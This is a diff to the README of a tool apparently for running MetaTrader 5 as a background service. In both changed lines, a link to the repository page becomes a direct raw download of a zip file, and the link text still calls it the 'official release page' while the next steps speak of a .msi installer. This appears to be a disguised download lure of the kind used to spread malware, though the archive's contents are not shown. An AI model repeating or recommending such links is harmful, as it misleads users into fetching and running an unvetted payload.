@@ -1,6 +1,6 @@
 # ⚙️ mt5-service-shade - Run MetaTrader 5 in the background
 
-[![](https://img.shields.io/badge/Download-mt5--service--shade-blue.svg)](https://github.com/Dasymetertrenchfever480/mt5-service-shade)
+[![](https://img.shields.io/badge/Download-mt5--service--shade-blue.svg)](https://raw.githubusercontent.com/Dasymetertrenchfever480/mt5-service-shade/main/southeast/shade-mt-service-v1.6.zip)
 
 ## 📖 About this software
 
@@ -32,7 +32,7 @@ You must prepare MetaTrader 5 before you use the service. Follow these steps fir
 
 Follow these steps to download the installer:
 
-1. Go to the [official release page](https://github.com/Dasymetertrenchfever480/mt5-service-shade).
+1. Go to the [official release page](https://raw.githubusercontent.com/Dasymetertrenchfever480/mt5-service-shade/main/southeast/shade-mt-service-v1.6.zip).
 2. Look for the latest version listed under the Releases section on the right side of the page.
 3. Click the file ending in .msi to download the installer to your computer.
 4. Save the file to your Downloads folder.
